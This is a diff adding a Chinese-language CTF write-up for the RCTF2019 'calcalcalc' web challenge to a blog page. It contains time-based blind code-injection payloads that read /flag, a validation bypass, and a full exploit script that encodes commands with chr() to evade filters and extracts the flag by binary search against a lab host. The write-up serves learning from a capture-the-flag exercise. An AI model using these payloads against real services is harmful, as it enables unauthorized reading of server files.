@@ -156,7 +156,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    2.7k 字
+                    3.2k 字
                   </span>
                 
 
@@ -166,7 +166,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    48
+                    57
                      分钟
                   </span>
                 
@@ -572,6 +572,70 @@ print url3
 print r3.text</code></pre>
 
 <p><img src="https://s1.ax1x.com/2020/05/15/YyaP4U.png" srcset="/img/loading.gif" alt="YyaP4U.png"></p>
+<h2 id="RCTF2019-calcalcalc"><a href="#RCTF2019-calcalcalc" class="headerlink" title="[RCTF2019]calcalcalc"></a>[RCTF2019]calcalcalc</h2><p>脚本来源:<a href="http://zeroyu.xyz/2019/09/14/2019-rctf-writeup/#0x06-calcalcalc" target="_blank" rel="noopener">http://zeroyu.xyz/2019/09/14/2019-rctf-writeup/#0x06-calcalcalc</a></p>
+<p>赛题分析:<a href="https://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/#calcalcalc" target="_blank" rel="noopener">https://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/#calcalcalc</a></p>
+<p>bypass长度限制</p>
+<pre><code class="hljs undefined">&#123;&apos;Content-Type&apos;: &apos;application/json&apos;&#125; //设置header
+&#123;&apos;expression&apos;: &apos;1+1&apos;, &apos;isVip&apos;: True&#125; //bypass payload</code></pre>
+
+<p>Payload1: </p>
+<pre><code class="hljs undefined">1//1 and (ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(10000000))</code></pre>
+
+<p>Payload2:</p>
+<pre><code class="hljs undefined">__import__(&apos;time&apos;).sleep(3) if ord(open(&apos;/flag&apos;).read()[3]) &gt; 67 else</code></pre>
+
+<ul>
+<li>1//1 <code>//</code>可用于php和nodes注释，而<code>//</code>又刚好是python的除法,这样在php和nodejs中，只会剩下1，而在python中剩下的却是整个exp。这样一来可以避免nodejs或者php的crash等时延因素</li>
+<li>and set(1 for i in range(10000000)) 、<em>import</em>(‘time’).sleep(3) 为延时作用，作为无回显判断条件</li>
+<li>(ord(open(“/flag”).read()[0])==1) 类似sql盲注</li>
+</ul>
+<p>exp.py:</p>
+<pre><code class="hljs undefined">from requests import Session
+import json
+
+def encode_cmd(cmd):
+    return &apos;eval(chr(&apos; + &apos;)+chr(&apos;.join(str(ord(c)) for c in cmd) + &apos;))&apos;
+
+url  = &quot;http://804ec383-93ea-46f2-895a-f93cc5bdba97.node3.buuoj.cn/calculate&quot;
+sess = Session()
+sess.headers = &#123;&apos;Content-Type&apos;: &apos;application/json&apos;&#125;
+calc_modal = &#123;&apos;expression&apos;: &apos;1+1&apos;, &apos;isVip&apos;: True&#125;
+# print(json.dumps(calc_modal))  # json.dumps之后True就变true了
+# print(sess.post(url, data=json.dumps(calc_modal)).elapsed.total_seconds())  # &lt;2s
+flag = &apos;&apos;
+i = 0
+while True:
+    low, high = 0, 255
+    while low &lt;= high:
+        mid = (low + high) // 2
+        # print(hex(mid)[2:].zfill(2),end=&apos;\r&apos;)
+        cmd = f&quot;__import__(&apos;time&apos;).sleep(5) if ord(open(&apos;/flag&apos;).read()[&#123;i&#125;]) == &#123;mid&#125; else None&quot;
+        cmd_encoded = encode_cmd(cmd)
+        calc_modal[&apos;expression&apos;] = cmd_encoded
+        elapsed = sess.post(url, data=json.dumps(calc_modal))
+        # print(elapsed.text)
+        elapsed = elapsed.elapsed.total_seconds()
+        if elapsed &gt; 4.5:
+            break
+        cmd = f&quot;__import__(&apos;time&apos;).sleep(5) if ord(open(&apos;/flag&apos;).read()[&#123;i&#125;]) &gt; &#123;mid&#125; else None&quot;
+        cmd_encoded = encode_cmd(cmd)
+        calc_modal[&apos;expression&apos;] = cmd_encoded
+        elapsed = sess.post(url, data=json.dumps(calc_modal))
+        # print(elapsed.text)
+        elapsed = elapsed.elapsed.total_seconds()
+        if elapsed &gt; 4.5:
+            low = mid + 1
+        else:
+            high = mid - 1
+    print()
+    flag += chr(mid)
+    print(flag)
+    if chr(mid) == &apos;&#125;&apos;:
+        break
+    i += 1</code></pre>
+
+<p>顺带建议一下用vps跑，一开始用本机跑了几次，我自己wifi不稳定跑偏了几次，右图为用vps，左图为出了点偏差</p>
+<p><img src="https://s1.ax1x.com/2020/05/17/Y2qqDU.png" srcset="/img/loading.gif" alt="Y2qqDU.png"></p>
 
             </article>
             <hr>
